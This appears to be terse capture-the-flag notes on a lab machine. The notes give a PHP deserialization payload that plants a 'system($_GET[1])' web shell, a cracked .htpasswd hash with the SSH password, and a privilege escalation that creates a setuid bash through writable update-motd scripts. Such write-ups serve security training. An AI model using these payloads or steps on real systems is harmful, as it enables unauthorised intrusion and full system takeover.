About php de-serialization

Fuzzing the url gives a backup which had index.php.bak

The payload is:
O:10:"FormSubmit":2:{s:9:"form_file";s:8:"test.php";s:7:"message";s:26:"<?php+system($_GET[1]);+?>";}

use payload on http://<IP>/index.php?debug=<payload>

/test.php?1=ls has rce

there's a hash file(.htpasswd), cracking it gives ssh creds

james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1:jamaica

writable files in /etc/update-motd.d, copy bash binary and chmod u+s to save in home directory

logout and login to get the binary
